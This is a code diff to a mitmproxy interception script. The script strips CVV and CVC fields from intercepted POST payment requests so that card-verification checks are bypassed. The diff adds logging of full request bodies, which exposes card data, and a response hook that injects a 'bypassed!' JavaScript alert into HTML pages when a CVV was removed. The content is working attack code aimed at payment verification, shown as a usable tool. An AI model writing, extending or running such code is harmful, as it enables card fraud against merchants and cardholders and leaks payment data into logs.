@@ -38,40 +38,84 @@ UNIVERSAL_CVV_PATTERNS = [
     rb"cvc_num=[\d]{3,4}"
 ]
 
-def clean_up_trailing_characters(request_body):
+def log_request_body(flow: http.HTTPFlow, message: str):
+    """
+    Logs the request body for debugging purposes.
+    """
+    ctx.log.info(f"{message}: {flow.request.content.decode('utf-8', errors='ignore')}")
+
+def clean_up_trailing_characters(request_body: bytes) -> bytes:
     """
     Cleans up trailing commas and quotes left behind after removing CVV values.
     """
-    request_body = re.sub(rb",\s*\"[^\"]*\":\s*\"\"", b"", request_body)
-    return request_body
+    cleaned_body = re.sub(rb",\s*\"[^\"]*\":\s*\"\"", b"", request_body)
+    return cleaned_body
 
-def remove_cvc_from_request_body(request_body):
+def remove_cvc_from_request_body(request_body: bytes) -> (bytes, bool):
     """
     Removes the CVV value from the request body based on the universal patterns.
+    Returns the modified body and a flag indicating whether any CVV was removed.
     """
+    original_body = request_body
     for pattern in UNIVERSAL_CVV_PATTERNS:
         request_body = re.sub(pattern, b"", request_body)
-    return request_body
+    return request_body, original_body != request_body
+
+def modify_request(flow: http.HTTPFlow) -> bool:
+    """
+    Modifies the intercepted request to remove CVV data.
+    Returns True if any CVV data was removed, otherwise False.
+    """
+    # Log the original request data for debugging
+    log_request_body(flow, "Original Request Body")
+
+    # Remove CVV codes from the payment data
+    modified_body, cvv_removed = remove_cvc_from_request_body(flow.request.content)
+    
+    # Clean up any trailing characters if necessary
+    modified_body = clean_up_trailing_characters(modified_body)
+
+    # Log the modified request data for debugging
+    log_request_body(flow, "Modified Request Body")
+
+    # Set the modified body back to the request
+    flow.request.content = modified_body
+    
+    return cvv_removed
+
+def inject_popup_script(html: str) -> str:
+    """
+    Injects a JavaScript popup script into the HTML content.
+    """
+    popup_script = '<script>alert("bypassed!");</script>'
+    modified_html = html.replace("</body>", f"{popup_script}</body>")
+    return modified_html
+
+def modify_response(flow: http.HTTPFlow, cvv_removed: bool):
+    """
+    Modifies the response to include a JavaScript popup if CVV data was removed.
+    """
+    if cvv_removed:
+        content_type = flow.response.headers.get("content-type", "")
+        if "text/html" in content_type:
+            html = flow.response.content.decode("utf-8", errors="ignore")
+            modified_html = inject_popup_script(html)
+            flow.response.content = modified_html.encode("utf-8")
 
 def request(flow: http.HTTPFlow):
     """
     This function intercepts and modifies requests to remove CVV data.
     """
     if flow.request.method == "POST":
-        # Log original request data for debugging
-        ctx.log.info(f"Original Request Body: {flow.request.content.decode('utf-8', errors='ignore')}")
+        cvv_removed = modify_request(flow)
+        flow.request.cvv_removed = cvv_removed  # Store the result in the flow object
 
-        # Remove CVV codes from the payment data
-        modified_body = remove_cvc_from_request_body(flow.request.content)
-        
-        # Clean up any trailing characters if necessary
-        modified_body = clean_up_trailing_characters(modified_body)
-
-        # Log modified request data for debugging
-        ctx.log.info(f"Modified Request Body: {modified_body.decode('utf-8', errors='ignore')}")
-
-        # Set the modified body back to the request
-        flow.request.content = modified_body
+def response(flow: http.HTTPFlow):
+    """
+    This function modifies the response to include a JavaScript popup if CVV data was removed.
+    """
+    if flow.request.method == "POST" and hasattr(flow.request, 'cvv_removed') and flow.request.cvv_removed:
+        modify_response(flow, flow.request.cvv_removed)
 
 def start():
     """
@@ -81,5 +125,6 @@ def start():
 
 # Attach handlers to mitmproxy
 addons = [
-    request
+    request,
+    response
 ]
